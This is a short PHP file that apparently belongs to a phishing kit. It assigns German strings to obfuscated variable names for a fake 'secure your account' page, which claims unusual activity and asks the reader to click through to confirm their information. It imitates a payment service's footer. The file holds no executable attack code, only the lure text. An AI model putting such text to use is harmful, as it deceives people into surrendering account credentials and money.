<?php
//SECURE PAGE
$xys30x = "Sichern Sie Ihr Konto";
$xys31x = "Wir haben eine ungewöhnliche Aktivität festgestellt";
$xys32x = "Wir benötigen Ihre Hilfe bei der Sicherung Ihres Kontos, um einen unbefugten Zugriff zu verhindern. Klicken Sie zu Ihrer Sicherheit auf Mein Konto sichern, um Ihre Informationen zu bestätigen.";
$xys33x = "Sichere mein Konto";
$xys34x = "wird bearbeitet...";
$xys35x = "Kontaktiere uns";
$xys36x = "Privatsphäre";
$xys37x = "Rechtliches";
$xys38x = "Weltweit";
?>